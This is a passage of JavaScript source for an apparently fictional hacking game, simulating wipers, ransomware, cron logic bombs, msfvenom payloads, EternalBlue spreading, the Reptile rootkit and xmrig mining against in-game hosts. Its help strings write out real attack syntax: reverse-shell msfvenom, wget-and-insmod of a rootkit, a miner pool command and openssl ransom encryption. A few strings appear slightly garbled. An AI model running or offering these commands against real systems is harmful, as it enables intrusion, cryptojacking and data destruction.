            if (!isInside) return "[-] shred: Must be executed on a remote host.";
            if (privilege !== 'root') return "[-] shred: Root required.";
            if (!arg1 || !['mbr', 'fs', 'full'].includes(arg1)) return `[-] shred: Select destruction depth:\n    shred mbr     — Overwrite boot record (fast)\n    shred fs      — Destroy file system (medium)\n    shred full    — Zero entire disk (slow)`;
            
            const depths = { mbr: { time: 1000, heatAdd: 10, mult: 0.5, label: 'MBR overwritten' }, fs: { time: 2000, heatAdd: 18, mult: 1.0, label: 'File system destroyed' }, full: { time: 3500, heatAdd: 25, mult: 1.5, label: 'Full disk zeroed' } };
            const depth = depths[arg1];
            
            setIsProcessing(true);
            setTerminal(prev => [...prev, { type: 'out', text: `shred: /dev/sda — ${arg1.toUpperCase()} destruction in progress...`, isNew: false }]);
            await new Promise(r => setTimeout(r, depth.time));
            
            const bounty = 0;
            setMoney(m => m + bounty);
            setHeat(h => Math.min(h + depth.heatAdd, 100));
            setBotnet(prev => prev.filter(ip => ip !== targetIP));
            setProxies(prev => prev.filter(ip => ip !== targetIP));
            
            const contractMsg = processContractDestruction(); // Call check AFTER destruction

            setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
            setWorld(prev => { const nw = { ...prev }; delete nw[targetIP]; return nw; });
            playDestroy();
            setIsProcessing(false);
            return `[+] DISK DESTROYED: ${destroyedName}\n[!] Node permanently wiped from the grid. Heat +20%.`;
          }
          
          if (!isInside) return "[-] shred: Must be executed on a remote host.";
          if (privilege !== 'root') return "[-] shred: Root required to destroy disk.";
          
          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `shred: /dev/sda — overwriting disk with 3-pass random data...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2000));
          
          const bounty = 0;
          setHeat(h => Math.min(h + 20, 100));
          setBotnet(prev => prev.filter(ip => ip !== targetIP));
          setProxies(prev => prev.filter(ip => ip !== targetIP));
          const destroyedName = world[targetIP]?.org?.orgName || targetIP;
          
          const contractMsg = processContractDestruction(); // Call check AFTER destruction

          setIsInside(false); setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
          setWorld(prev => { const nw = { ...prev }; delete nw[targetIP]; return nw; });
          playDestroy();
          setIsProcessing(false);
          return `[+] DISK DESTROYED: ${destroyedName}\n[+] Destruction bounty: ₿${bounty.toLocaleString()}\n[!] Node permanently wiped from the grid. Heat +20%.${contractMsg}`;
        } catch (err) {
          setIsProcessing(false);
          return `[-] CRITICAL ERROR in shred module: ${err.message}`;
        }
      },

      openssl: async () => {
        try {
          const mult = getRewardMult(gameMode);
          
          // Helper function for contract check
          const processContractRansom = () => {
            let msg = '';
            const currentContract = contracts.find(c => c.active && !c.completed);
            if (currentContract) {
              const isRansom = currentContract.objectives?.some(o => o.ip === targetIP && o.type === 'ransom');
              if (isRansom) {
                const timeTaken = (Date.now() - currentContract.startTime) / 1000;
                const rewardVal = currentContract.reward || 0;
                const repVal = currentContract.repReward || 0;
                
                if (timeTaken <= (currentContract.timeLimit || 9999) && heat <= (currentContract.heatCap || 100)) {
                  setMoney(m => m + rewardVal);
                  setReputation(r => r + repVal);
                  completeContractAndRemove(currentContract.id); trackContract(true);
                  msg = `\n\n[FIXER] CONTRACT FULFILLED.\n[+] BONUS: ₿${rewardVal.toLocaleString()} + ${repVal} REP`;
                } else {
                  completeContractAndRemove(currentContract.id); trackContract(false);
                  msg = `\n\n[FIXER] CONTRACT FAILED. Time Limit or Heat Cap exceeded.`;
                }
              }
            }
            return msg;
          };

          if (gameMode === 'operator') {
            if (!isInside) return "[-] openssl: Must be on remote host.";
            if (privilege !== 'root') return "[-] openssl: Permission denied.";
            const hasEnc = args.includes('enc');
            const hasCipher = args.some(a => a.startsWith('-aes'));
            if (!hasEnc || !hasCipher) return `[-] openssl: Invalid syntax.\n[*] Usage: openssl enc -aes-256-cbc -salt -in /target -out /target.locked -k <key>`;
            
            const cipher = args.find(a => a.startsWith('-aes')) || '-aes-256-cbc';
            const strength = cipher.includes('256') ? 'AES-256' : 'AES-128';
            const isStrong = cipher.includes('256');
            
            setIsProcessing(true);
            setTerminal(prev => [...prev, { type: 'out', text: `[*] Encrypting file system with ${strength}-CBC...\n[*] Targeting: *.sql, *.doc, *.pdf, *.csv, *.xls, *.bak\n[*] Writing ransom note to /README_LOCKED.txt...`, isNew: false }]);
            await new Promise(r => setTimeout(r, isStrong ? 3000 : 1500));
            
            const ransomAsk = getEconomyPayout({ action: isStrong ? 'ransom_strong' : 'ransom_fast' });
            const paid = Math.random() < (isStrong ? 0.7 : 0.4);
            
            setHeat(h => Math.min(h + 30, 100));
            escalateBlueTeam(targetIP, 40);
            
            const contractMsg = processContractRansom(); // Check contract AFTER deploying payload
            
            if (paid) {
              setMoney(m => m + ransomAsk); playSuccess(); setIsProcessing(false);
              return `[+] ${strength} encryption complete. Systems locked.\n[+] VICTIM PAID: ₿${ransomAsk.toLocaleString()}\n[!] Heat +30%. Law enforcement notified.${contractMsg}`;
            } else {
              playFailure(); setIsProcessing(false);
              return `[+] ${strength} encryption complete. Systems locked.\n[-] VICTIM REFUSED TO PAY. No payout.\n[!] Heat +30%.${contractMsg}`;
            }
          }
          
          if (gameMode === 'field') {
            if (!isInside) return "[-] openssl: Must be on remote host.";
            if (privilege !== 'root') return "[-] openssl: Root required.";
            if (args.length < 2 || !['strong', 'fast'].includes(args[1])) {
              return `[-] openssl: Configure ransomware deployment:\n    openssl strong   — AES-256 (slower, unbreakable, 70% pay rate)\n    openssl fast     — AES-128 (faster, crackable, 40% pay rate)\n[*] Set ransom amount with second arg: openssl strong 200000`;
            }
            
            const isStrong = args[1] === 'strong';
            const customRansom = parseInt(args[2]);
            const strength = isStrong ? 'AES-256' : 'AES-128';
            
            setIsProcessing(true);
            setTerminal(prev => [...prev, { type: 'out', text: `[*] Deploying ${strength} ransomware payload...\n[*] Encrypting critical data...`, isNew: false }]);
            await new Promise(r => setTimeout(r, isStrong ? 2500 : 1500));
            
            const econRansom = getEconomyPayout({ action: isStrong ? 'ransom_strong' : 'ransom_fast' });
            const baseRansom = isStrong ? 150000 : 80000;
            const ransomAsk = (customRansom && !isNaN(customRansom)) ? Math.floor((econRansom + customRansom) / 2) : econRansom;
            const payPenalty = (customRansom && !isNaN(customRansom)) ? Math.max(0, (customRansom - baseRansom) / baseRansom * 0.3) : 0;
            const paid = Math.random() < ((isStrong ? 0.7 : 0.4) - payPenalty);
            
            setHeat(h => Math.min(h + 25, 100));
            escalateBlueTeam(targetIP, 35);
            
            const contractMsg = processContractRansom(); // Check contract AFTER deploying payload

            if (paid) { setMoney(m => m + ransomAsk); playSuccess(); } else { playFailure(); }
            setIsProcessing(false);
            
            const orgNameField = world[targetIP]?.org?.orgName || 'Target';
            return paid
              ? `[+] ${strength} ransomware deployed. ${orgNameField} locked.\n[+] VICTIM PAID: ₿${ransomAsk.toLocaleString()}. Heat +25%.${contractMsg}`
              : `[+] ${strength} ransomware deployed. Victim refused to pay.\n[!] Heat +25%. No payout.${contractMsg}`;
          }
          
          if (!isInside) return "[-] openssl: Must be on remote host.";
          if (privilege !== 'root') return "[-] openssl: Root required for ransomware deployment.";
          
          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Encrypting target file system with AES-256-CBC...\n[*] Generating ransom note...\n[*] Demanding payment...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2500));
          
          const ransomAsk = getEconomyPayout({ action: 'ransom_strong' });
          const paid = Math.random() < 0.6;
          setHeat(h => Math.min(h + 20, 100));
          escalateBlueTeam(targetIP, 30);
          
          const contractMsg = processContractRansom(); // Check contract AFTER deploying payload

          if (paid) { setMoney(m => m + ransomAsk); playSuccess(); } else { playFailure(); }
          setIsProcessing(false);
          
          const orgName = world[targetIP]?.org?.orgName || 'Target';
          return paid
            ? `[+] RANSOMWARE DEPLOYED on ${orgName}.\n[+] VICTIM PAID: ₿${ransomAsk.toLocaleString()}\n[!] Heat +20%. Expect law enforcement attention.${contractMsg}`
            : `[+] RANSOMWARE DEPLOYED on ${orgName}.\n[-] VICTIM REFUSED TO PAY. No payout.\n[!] Heat +20%.${contractMsg}`;
            
        } catch (err) {
          setIsProcessing(false);
          return `[-] CRITICAL ERROR in openssl module: ${err.message}`;
        }
      },
      crontab: async () => {
        if (!isInside) return "[-] crontab: Must be on remote host.";
        if (privilege !== 'root') return "[-] crontab: Root required to schedule jobs.";
        
        if (gameMode === 'operator') {
          if (!arg1 || arg1 !== '-e') return "[-] Usage: crontab -e\n[*] Then specify: <minutes> <payload>\n[*] Example: crontab -e 5 shred    (shred in 5 minutes)\n[*] Example: crontab -e 15 openssl  (ransomware in 15 minutes)\n[*] Cron syntax: M H DOM MON DOW command";
          const delay = parseInt(args[2]);
          const payload = args[3];
          if (!delay || !payload) return "[-] crontab: Specify delay in minutes and payload.\n[*] crontab -e <minutes> <shred|openssl>";
          if (!['shred', 'openssl'].includes(payload)) return "[-] crontab: Invalid payload. Use: shred or openssl";
          
          const bombKey = `bomb_${targetIP}`;
          const bombIP = targetIP;
          const bombOrg = world[targetIP]?.org?.orgName || targetIP;
          const bombVal = world[targetIP]?.val || 2000;
          
          setTerminal(prev => [...prev, { type: 'out', text: `crontab: installing new crontab\n# m h dom mon dow command\n${delay} * * * * /tmp/.${payload}.sh\n[+] Logic bomb planted. ${payload} detonates in ${delay} minute${delay > 1 ? 's' : ''}.`, isNew: true }]);
          
          setTimeout(() => {
            const mult = getRewardMult(gameMode);
            if (payload === 'shred') {
              const bounty = Math.floor(bombVal * 1.5 * mult);
              setMoney(m => m + bounty);
              setHeat(h => Math.min(h + 15, 100));
              setBotnet(prev => prev.filter(ip => ip !== bombIP));
              setProxies(prev => prev.filter(ip => ip !== bombIP));
              setWorld(prev => { const nw = { ...prev }; delete nw[bombIP]; return nw; });
              playDestroy();
              setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Logic bomb triggered on ${bombOrg} (${bombIP}).\n[+] shred executed. System destroyed. Bounty: ₿${bounty.toLocaleString()}. Heat +15%.`, isNew: true }]);
            } else {
              const ransomAsk = Math.floor(120000 * mult);
              const paid = Math.random() < 0.6;
              setHeat(h => Math.min(h + 15, 100));
              if (paid) { setMoney(m => m + ransomAsk); playSuccess(); } else { playFailure(); }
              setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Logic bomb triggered on ${bombOrg} (${bombIP}).\n[+] openssl ransomware deployed. ${paid ? `VICTIM PAID: ₿${ransomAsk.toLocaleString()}` : 'VICTIM REFUSED TO PAY.'}. Heat +15%.`, isNew: true }]);
            }
          }, delay * 60000);
          
          return null;
        }
        
        if (!arg1) return `[-] crontab: Configure logic bomb:\n    crontab 5 shred     — Wiper detonates in 5 minutes\n    crontab 15 openssl  — Ransomware in 15 minutes\n    crontab 30 shred    — Wiper in 30 minutes (more time to exit cleanly)`;
        const delay = parseInt(arg1);
        const payload = args[2];
        if (!delay || !payload || !['shred', 'openssl'].includes(payload)) return "[-] crontab: Specify minutes and payload (shred or openssl)";
        
        if (gameMode === 'field') {
          const bombIP = targetIP;
          const bombOrg = world[targetIP]?.org?.orgName || targetIP;
          const bombVal = world[targetIP]?.val || 2000;
          
          setTimeout(() => {
            const mult = getRewardMult(gameMode);
            if (payload === 'shred') {
              const bounty = Math.floor(bombVal * 1.5 * mult);
              setMoney(m => m + bounty);
              setHeat(h => Math.min(h + 12, 100));
              setBotnet(prev => prev.filter(ip => ip !== bombIP));
              setProxies(prev => prev.filter(ip => ip !== bombIP));
              setWorld(prev => { const nw = { ...prev }; delete nw[bombIP]; return nw; });
              playDestroy();
              setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Cron job fired on ${bombOrg}. shred complete. Bounty: ₿${bounty.toLocaleString()}. Heat +12%.`, isNew: true }]);
            } else {
              const ransomAsk = Math.floor(120000 * mult);
              const paid = Math.random() < 0.6;
              setHeat(h => Math.min(h + 12, 100));
              if (paid) { setMoney(m => m + ransomAsk); playSuccess(); } else { playFailure(); }
              setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Cron job fired on ${bombOrg}. Ransomware deployed. ${paid ? `PAID: ₿${ransomAsk.toLocaleString()}` : 'REFUSED TO PAY.'}. Heat +12%.`, isNew: true }]);
            }
          }, delay * 60000);
          
          return `[+] Logic bomb scheduled: ${payload} on ${world[targetIP]?.org?.orgName || targetIP} in ${delay} minutes.\n[*] Exit the system before detonation to minimize trace.`;
        }
        
        const bombIP = targetIP;
        const bombOrg = world[targetIP]?.org?.orgName || targetIP;
        const bombVal = world[targetIP]?.val || 2000;
        
        setTimeout(() => {
          if (payload === 'shred') {
            const bounty = Math.floor(bombVal * 1.5);
            setMoney(m => m + bounty);
            setHeat(h => Math.min(h + 10, 100));
            setBotnet(prev => prev.filter(ip => ip !== bombIP));
            setProxies(prev => prev.filter(ip => ip !== bombIP));
            setWorld(prev => { const nw = { ...prev }; delete nw[bombIP]; return nw; });
            playDestroy();
            setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Logic bomb on ${bombOrg} — DESTROYED. Bounty: ₿${bounty.toLocaleString()}.`, isNew: true }]);
          } else {
            const ransomAsk = 120000;
            const paid = Math.random() < 0.6;
            setHeat(h => Math.min(h + 10, 100));
            if (paid) { setMoney(m => m + ransomAsk); playSuccess(); } else { playFailure(); }
            setTerminal(prev => [...prev, { type: 'out', text: `\n[DETONATION] Logic bomb on ${bombOrg} — Ransomware. ${paid ? `PAID: ₿${ransomAsk.toLocaleString()}` : 'REFUSED.'}`, isNew: true }]);
          }
        }, delay * 60000);
        
        return `[+] Logic bomb planted: ${payload} detonates in ${delay} min on ${bombOrg}.\n[*] Get out before it blows.`;
      },

      msfvenom: async () => {
        if (!isInside) return "[-] msfvenom: Must be on a remote host to generate and deploy payloads.";
        if (privilege !== 'root') return "[-] msfvenom: Root required for payload deployment.";
        const mult = getRewardMult(gameMode);
        const node = world[targetIP];
        if (!node) return "[-] msfvenom: Target node not found.";

        if (gameMode === 'operator') {
          const hasP = args.indexOf('-p');
          const hasF = args.indexOf('-f');
          const hasO = args.indexOf('-o');
          const hasLHOST = args.some(a => a.startsWith('LHOST='));
          if (hasP === -1 || hasF === -1 || !hasLHOST) return `[-] msfvenom: Invalid syntax.\n[*] Usage: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>\n[*] Payloads:\n    linux/x64/meterpreter/reverse_tcp\n    linux/x64/shell_reverse_tcp\n    windows/meterpreter/reverse_tcp\n[*] Formats: elf, exe, py, sh\n[*] Example: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o agent.bin`;

          const payload = args[hasP + 1] || '';
          const format = args[hasF + 1] || 'elf';
          const outFile = hasO !== -1 ? args[hasO + 1] : 'payload.bin';
          const isLinux = payload.includes('linux');
          const targetSec = node.sec;

          if (!isLinux && targetSec !== 'high') {
            return `[-] msfvenom: Payload architecture mismatch. Target runs Linux, not Windows.\n[!] Trace +5%. Failed deployment logged by IDS.`;
          }

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of ${format} file: 250 bytes\nSaved as: /tmp/${outFile}\n\n[*] Deploying ${outFile} to internal subnet via ${targetIP}...\n[*] Scanning for adjacent hosts...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2500));

          const infectCount = Math.floor(Math.random() * 2) + 1;
          let newNodes = [];
          for (let i = 0; i < infectCount; i++) {
            const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
            newNodes.push(newNode);
            setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
            setBotnet(prev => [...prev, newNode.ip]);
          }
          
          setHeat(h => Math.min(h + 8, 100));
          escalateBlueTeam(targetIP, 20);
          playBeacon();
          setIsProcessing(false);
          return `[+] Payload deployed. Meterpreter callbacks received:\n${newNodes.map((n, i) => `    [+] Session ${i + 1}: ${n.ip} (${n.data.org?.orgName || 'Unknown'})`).join('\n')}\n[+] ${infectCount} new botnet node${infectCount > 1 ? 's' : ''} acquired. Heat +8%.`;
        }

        if (gameMode === 'field') {
          if (!arg1) return `[-] msfvenom: Select payload configuration:\n    msfvenom reverse    — Reverse shell (stealthy, 1-2 infections)\n    msfvenom miner      — Cryptominer dropper (passive income spread)\n    msfvenom wiper      — Wiper dropper (destroys on trigger)`;

          const payloadType = arg1;
          if (!['reverse', 'miner', 'wiper'].includes(payloadType)) return "[-] msfvenom: Invalid payload. Use: reverse, miner, or wiper";

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Generating ${payloadType} payload for linux/x64...\n[*] Payload size: ${Math.floor(Math.random() * 200 + 100)} bytes\n[*] Deploying to internal subnet...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2000));

          const infectCount = payloadType === 'reverse' ? Math.floor(Math.random() * 2) + 1 : Math.floor(Math.random() * 3) + 1;
          let newNodes = [];
          for (let i = 0; i < infectCount; i++) {
            const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
            newNodes.push(newNode);
            setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
            if (payloadType !== 'wiper') setBotnet(prev => [...prev, newNode.ip]);
          }

          const heatAdd = payloadType === 'reverse' ? 5 : payloadType === 'miner' ? 8 : 15;
          setHeat(h => Math.min(h + heatAdd, 100));
          escalateBlueTeam(targetIP, 15);
          playBeacon();
          setIsProcessing(false);

          let result = `[+] ${payloadType.toUpperCase()} payload propagated to ${infectCount} host${infectCount > 1 ? 's' : ''}:\n${newNodes.map(n => `    ${n.ip} — ${n.data.org?.orgName || 'Unknown'}`).join('\n')}`;
          if (payloadType === 'miner') result += `\n[+]ig deployed on all infected nodes. Passive income active.`;
          if (payloadType === 'wiper') result += `\n[!] Wiper armed. Use 'crontab' to set detonation timer on each node.`;
          result += `\n[!] Heat +${heatAdd}%.`;
          return result;
        }

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Generating reverse_tcp payload...\n[*] Deploying to internal subnet...\n[*] Scanning for vulnerable hosts...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 2000));

        const infectCount = Math.floor(Math.random() * 2) + 1;
        let newNodes = [];
        for (let i = 0; i < infectCount; i++) {
          const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
          newNodes.push(newNode);
          setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
          setBotnet(prev => [...prev, newNode.ip]);
        }

        setHeat(h => Math.min(h + 5, 100));
        playBeacon();
        setIsProcessing(false);
        return `[+] PAYLOAD DEPLOYED — ${infectCount} new node${infectCount > 1 ? 's' : ''} infected:\n${newNodes.map(n => `    ${n.ip} — ${n.data.org?.orgName || 'Unknown'}`).join('\n')}\n[+] All nodes added to botnet. Heat +5%.`;
      },

      eternalblue: async () => {
        if (!isInside) return "[-] eternalblue: Must be inside a network to launch SMB propagation.";
        if (privilege !== 'root') return "[-] eternalblue: Root required for kernel exploit deployment.";
        const mult = getRewardMult(gameMode);

        if (gameMode === 'operator') {
          const hasRHOSTS = args.some(a => a.startsWith('RHOSTS=') || a.includes('/24') || a.includes('/16'));
          if (!hasRHOSTS) return `[-] eternalblue: Specify target subnet.\n[*] Usage: eternalblue RHOSTS=<subnet/24> PAYLOAD=<payload>\n[*] Example: eternalblue RHOSTS=10.0.0.0/24 PAYLOAD=windows/x64/meterpreter/reverse_tcp\n[*] WARNING: This exploit is LOUD. All IDS/IPS systems will fire.`;

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] exploit/windows/smb/ms17_010_eternalblue\n[*] Started reverse TCP handler\n[*] ${targetIP} - Sending exploit packet...\n[*] ${targetIP} - SMBv1 session negotiation...\n[*] Sending all-in-one exploit packet...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 1500));

          const infectCount = Math.floor(Math.random() * 3) + 3;
          let newNodes = [];
          for (let i = 0; i < infectCount; i++) {
            const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
            newNodes.push(newNode);
            setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
            setBotnet(prev => [...prev, newNode.ip]);
            setTerminal(prev => [...prev, { type: 'out', text: `[*] ${newNode.ip}:445 - WIN! Meterpreter session ${i + 1} opened`, isNew: false }]);
            await new Promise(r => setTimeout(r, 400));
          }

          setHeat(h => Math.min(h + 35, 100));
          playHeatSpike();
          escalateBlueTeam(targetIP, 50);
          setIsProcessing(false);

          const patched = Math.floor(Math.random() * 2);
          let out = `\n[*] Exploit completed. ${infectCount} sessions opened, ${patched} hosts patched/immune.`;
          out += `\n${newNodes.map((n, i) => `[+] Session ${i + 1}: ${n.ip} (${n.data.org?.orgName})`).join('\n')}`;
          out += `\n\n[!!!] CRITICAL: EternalBlue triggered every IDS on the subnet. Heat +35%.`;
          if (infectCount >= 5) out += `\n[+] Mass exploitation crashed the monitoring stack. SOC is blind for now.`;
          return out;
        }

        if (gameMode === 'field') {
          if (!arg1) return `[-] eternalblue: Select propagation scope:\n    eternalblue targeted  — Hit 2-3 specific SMB hosts (moderate noise)\n    eternalblue subnet    — Blast entire /24 subnet (maximum spread, maximum noise)\n[!] WARNING: EternalBlue is the loudest exploit in existence.`;

          const scope = arg1;
          if (!['targeted', 'subnet'].includes(scope)) return "[-] eternalblue: Invalid scope. Use: targeted or subnet";

          setIsProcessing(true);
          const infectCount = scope === 'subnet' ? Math.floor(Math.random() * 3) + 3 : Math.floor(Math.random() * 2) + 2;
          
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Launching EternalBlue (MS17-010) — ${scope} mode...\n[*] Scanning for SMBv1 hosts on ${scope === 'subnet' ? 'entire /24' : 'selected targets'}...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2000));

          let newNodes = [];
          for (let i = 0; i < infectCount; i++) {
            const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
            newNodes.push(newNode);
            setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
            setBotnet(prev => [...prev, newNode.ip]);
          }

          const heatAdd = scope === 'subnet' ? 35 : 20;
          setHeat(h => Math.min(h + heatAdd, 100));
          if (heatAdd >= 30) playHeatSpike();
          escalateBlueTeam(targetIP, scope === 'subnet' ? 50 : 30);
          setIsProcessing(false);
          return `[+] EternalBlue propagation complete. ${infectCount} hosts compromised:\n${newNodes.map(n => `    ${n.ip} — ${n.data.org?.orgName}`).join('\n')}\n[!] Heat +${heatAdd}%. ${scope === 'subnet' ? 'Every alarm on the network just fired.' : 'Multiple IDS alerts triggered.'}`;
        }

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Launching EternalBlue (MS17-010)...\n[*] Exploiting SMBv1 across subnet...\n[*] Shells incoming...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 2500));

        const infectCount = Math.floor(Math.random() * 3) + 3;
        let newNodes = [];
        for (let i = 0; i < infectCount; i++) {
          const newNode = generateNewTarget(null, targetIP, directorRef.current?.modifiers, world[targetIP]);
          newNodes.push(newNode);
          setWorld(prev => ({ ...prev, [newNode.ip]: newNode.data }));
          setBotnet(prev => [...prev, newNode.ip]);
        }

        setHeat(h => Math.min(h + 30, 100));
        playHeatSpike();
        setIsProcessing(false);
        return `[+] ETERNALBLUE MASS EXPLOITATION — ${infectCount} systems compromised:\n${newNodes.map(n => `    ${n.ip} — ${n.data.org?.orgName}`).join('\n')}\n[+] All added to botnet.\n[!!!] Heat +30%. This is the loudest thing you can do on a network.`;
      },

      reptile: async () => {
        if (!isInside) return "[-] reptile: Must be on a remote host.";
        if (privilege !== 'root') return "[-] reptile: Root required for kernel module insertion.";
        const node = world[targetIP];
        if (!node) return "[-] reptile: Target not found.";

        const reptileKey = `reptile_${targetIP}`;
        if (looted.includes(reptileKey)) return "[-] reptile: Kernel rootkit already installed on this node.";

        if (gameMode === 'operator') {
          const hasInsmod = args.includes('insmod') || trimmed.includes('insmod');
          const hasKo = args.some(a => a.endsWith('.ko'));
          if (!hasInsmod && !hasKo) return `[-] reptile: Manual installation required.\n[*] Steps:\n    1. wget https://github.com/f0rb1dd3n/Reptile/archive/master.tar.gz\n    2. tar -xf master.tar.gz && cd Reptile-master\n    3. make TARGET=$(uname -r)\n    4. insmod reptile.ko\n[*] Shortcut: reptile insmod reptile.ko\n[*] Verify: lsmod | grep reptile (should return empty if working)`;

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Compiling reptile module for kernel ${Math.floor(Math.random()*3)+4}.${Math.floor(Math.random()*15)}.0-generic...\n  CC [M]  reptile.o\n  CC [M]  reptile_module.o\n  LD [M]  reptile.ko\n[*] insmod reptile.ko\n[*] Verifying installation...`, isNew: false }]);
          await new Promise(r => setTimeout(r, 2000));

          setLooted(prev => [...prev, reptileKey]);
          setWorld(prev => {
            const nw = { ...prev };
            if (nw[targetIP]) nw[targetIP] = { ...nw[targetIP], blueTeam: { ...nw[targetIP].blueTeam, alertLevel: 0, activeHunting: false } };
            return nw;
          });
          playSuccess();
          setIsProcessing(false);
          return `# lsmod | grep reptile\n# (no output — rootkit is hidden)\n\n[+] Reptile kernel rootkit installed.\n[+] C2 beacon is now invisible to host-based detection.\n[+] Blue Team alert level reset to 0. Node is permanently stealth.`;
        }

        if (gameMode === 'field') {
          if (!arg1) return `[-] reptile: Select installation method:\n    reptile kernel    — Kernel module (fast, detected by rkhunter)\n    reptile preload   — LD_PRELOAD hook (stealthy, may not survive reboot)\n    reptile firmware   — UEFI implant (permanent, only on supported hardware)`;
          
          if (!['kernel', 'preload', 'firmware'].includes(arg1)) return "[-] reptile: Invalid method. Use: kernel, preload, or firmware";

          setIsProcessing(true);
          const methods = {
            kernel: { time: 1500, label: 'Kernel module loaded via insmod', stealth: 'moderate' },
            preload: { time: 2000, label: 'LD_PRELOAD hook injected into /etc/ld.so.preload', stealth: 'high' },
            firmware: { time: 3000, label: 'UEFI firmware implant written to SPI flash', stealth: 'permanent' },
          };
          const method = methods[arg1];
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Installing reptile via ${arg1} method...\n[*] ${method.label}...`, isNew: false }]);
          await new Promise(r => setTimeout(r, method.time));

          setLooted(prev => [...prev, reptileKey]);
          setWorld(prev => {
            const nw = { ...prev };
            if (nw[targetIP]) nw[targetIP] = { ...nw[targetIP], blueTeam: { ...nw[targetIP].blueTeam, alertLevel: 0, activeHunting: false } };
            return nw;
          });
          playSuccess();
          setIsProcessing(false);
          return `[+] Reptile rootkit installed (${arg1} method, stealth: ${method.stealth}).\n[+] Node is now invisible to Blue Team. Alert level zeroed.`;
        }

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Compiling reptile kernel rootkit...\n[*] Loading module into kernel...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 1500));

        setLooted(prev => [...prev, reptileKey]);
        setWorld(prev => {
          const nw = { ...prev };
          if (nw[targetIP]) nw[targetIP] = { ...nw[targetIP], blueTeam: { ...nw[targetIP].blueTeam, alertLevel: 0, activeHunting: false } };
          return nw;
        });
        playSuccess();
        setIsProcessing(false);
        return `[+] REPTILE ROOTKIT INSTALLED.\n[+] Your presence on ${world[targetIP]?.org?.orgName || targetIP} is now invisible.\n[+] Blue Team can no longer detect or remove your C2 beacon.`;
      },

      xmrig: async () => {
        if (!isInside) return "[-] xmrig: Must be on a remote host.";
        if (privilege !== 'root') return "[-] xmrig: Root required to maximize CPU access.";
        if (!botnet.includes(targetIP)) return "[-] xmrig: Deploy sliver C2 beacon first to maintain persistent mining.";
        
        const xmrigKey = `xmrig_${targetIP}`;
        if (looted.includes(xmrigKey)) return "[-] xmrig: Miner already running on this node.";
        if (gameMode === 'operator') {
          const hasConfig = args.includes('--config') || args.some(a => a.includes('config.json'));
          const hasBg = args.includes('--background') || args.includes('-B');
          if (!hasConfig && !hasBg) return `[-] xmrig: Configuration required.\n[*] Usage: xmrig --config config.json --background\n[*] Or:    xmrig -o pool.minexmr.com:443 -u <wallet> -p x --background\n[*] Options:\n    --threads <n>     CPU threads (higher = more income, more detection risk)\n    --background / -B  Run as daemon (CRITICAL: forgetting this loses your shell)\n    --max-cpu <n>     Cap CPU usage (50-100%)`;

          if (!hasBg) {
            return `[-] xmrig: Miner started in foreground — YOUR SHELL IS NOW BLOCKED.\n[!] You can see hashrate output but cannot type commands.\n[!] Connection will timeout. Always use --background flag.\n[-] Session lost. Reconnect required.`;
          }

          const threads = args.includes('--threads') ? parseInt(args[args.indexOf('--threads') + 1]) || 4 : 4;
          const maxCpu = args.includes('--max-cpu') ? parseInt(args[args.indexOf('--max-cpu') + 1]) || 75 : 75;
          const incomeBonus = Math.floor(((threads * maxCpu * 2) + HOURLY_RATE) * getMineRigMult() * getEconomyMarketMult());

          setIsProcessing(true);
          setTerminal(prev => [...prev, { type: 'out', text: ` * ABOUT       ig/6.19.0 gcc/11.3.0\n * LIBS         libuv/1.44.1 OpenSSL/3.0.2\n * POOL         pool.minexmr.com:443\n * CPU          ${threads} threads, ${maxCpu}% max usage\n * DONATE       1%\n[*] Starting mining daemon in background...\n[*] pid: ${Math.floor(Math.random() * 30000 + 10000)}`, isNew: false }]);
          await new Promise(r => setTimeout(r, 1500));

          setLooted(prev => [...prev, xmrigKey]);
          let rawHeat = maxCpu > 80 ? 8 : maxCpu > 50 ? 4 : 2;
          const heatAdd = inventory.includes('Cooling') ? Math.ceil(rawHeat / 2) : rawHeat;
